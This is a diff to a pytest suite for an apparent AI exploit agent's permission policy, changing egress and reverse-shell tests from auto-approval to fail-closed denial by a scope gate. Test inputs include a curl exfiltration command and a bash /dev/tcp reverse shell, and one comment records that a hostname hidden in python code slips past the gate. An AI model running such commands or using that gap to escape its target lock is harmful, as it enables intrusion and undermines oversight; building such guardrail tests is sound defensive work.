@@ -237,6 +237,7 @@ def test_any_destructive_property():
 
 
 def _make_full_access_policy(tmp_path: Path, target_ip: str = "10.0.0.50"):
+    from scope_gate import ScopeGate
     from tools.exploit_agent import ExploitPermission, ExploitPolicy, ExploitSettings
 
     settings = ExploitSettings(
@@ -247,7 +248,13 @@ def _make_full_access_policy(tmp_path: Path, target_ip: str = "10.0.0.50"):
         target_ip=target_ip,
         workspace_root=tmp_path,
     )
-    policy = ExploitPolicy(settings, tmp_path)
+    gate = ScopeGate(
+        None,  # type: ignore[arg-type]
+        "",
+        allowed_assets=[target_ip],
+        risk_profile="high_authorized_testing",
+    )
+    policy = ExploitPolicy(settings, tmp_path, scope_gate=gate)
     # Simulate run_exploit_agent binding the lock.
     policy._locked_ip = target_ip
     policy._allowed_targets = [target_ip]
@@ -267,22 +274,22 @@ async def test_policy_auto_approves_destructive_in_full_access(tmp_path: Path):
 
 @pytest.mark.asyncio
 async def test_policy_auto_approves_egress_in_full_access(tmp_path: Path):
-    """LAB BUILD: egress to a non-target IP is auto-approved by the policy; the
-    target lock is enforced at the tool layer (the MCP server refuses the
-    non-target destination via the allowlist)."""
+    """Fail closed: egress to a non-target IP is denied by the mission gate
+    (SCOPE_DENIED); the MCP allowlist lock enforces the same at the tool layer."""
     policy = _make_full_access_policy(tmp_path)
     approved = await policy.approve_action("run_exploit_terminal", "curl http://10.0.0.99/exfil")
-    assert approved is True
+    assert approved is False
+    assert any(r.status == "SCOPE_DENIED" for r in policy._records)
 
 
 @pytest.mark.asyncio
 async def test_policy_auto_approves_reverse_shell_in_full_access(tmp_path: Path):
-    """LAB BUILD: reverse shells are auto-approved by the policy (the AI may do
-    whatever it takes to the locked target). The target lock is enforced at the
-    tool layer."""
+    """Fail closed: reverse shell to a non-target IP is denied by the mission
+    gate (the target lock is enforced at both policy and tool layers)."""
     policy = _make_full_access_policy(tmp_path)
     approved = await policy.approve_action("run_exploit_terminal", "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1")
-    assert approved is True
+    assert approved is False
+    assert any(r.status == "SCOPE_DENIED" for r in policy._records)
 
 
 @pytest.mark.asyncio
@@ -306,9 +313,9 @@ async def test_policy_auto_approves_destructive_python_in_full_access(tmp_path: 
 
 @pytest.mark.asyncio
 async def test_policy_auto_approves_egress_payload_in_full_access(tmp_path: Path):
-    """LAB BUILD regression guard: analysis_payload still returns the command in
-    full (the [:300] truncation fix in run_exploit_agent is preserved), and the
-    policy auto-approves it. The target lock lives at the tool layer."""
+    """Fail-closed regression guard: analysis_payload still returns the command in
+    full (the [:300] truncation fix is preserved), but the policy denies the
+    foreign egress via the mission gate."""
     from tools.command_analyzer import analysis_payload
 
     policy = _make_full_access_policy(tmp_path)
@@ -318,7 +325,8 @@ async def test_policy_auto_approves_egress_payload_in_full_access(tmp_path: Path
     full = analysis_payload("run_exploit_terminal", {"command": payload})
     assert full == payload  # analysis_payload returns the command in full
     approved = await policy.approve_action("run_exploit_terminal", full)
-    assert approved is True
+    assert approved is False
+    assert any(r.status == "SCOPE_DENIED" for r in policy._records)
 
 
 @pytest.mark.asyncio
@@ -778,10 +786,10 @@ def test_python_bare_socket_not_false_fire():
 
 @pytest.mark.asyncio
 async def test_policy_auto_approves_python_socket_reverse_shell_to_hostname(tmp_path: Path):
-    # LAB BUILD: full_access auto-approves a python reverse shell (the policy no
-    # longer inspects code for egress). analysis_payload still returns the raw
-    # code (the repr/truncation fix is preserved); the target lock is enforced
-    # at the MCP tool layer, not by the policy.
+    # LAB BUILD: the mission gate vets extracted destinations; a hostname buried
+    # in python code extracts no destination, so the policy falls back to the
+    # locked target and approves. The MCP allowlist scans the python body and
+    # is the lock for this path.
     from tools.command_analyzer import analysis_payload
 
     policy = _make_full_access_policy(tmp_path)
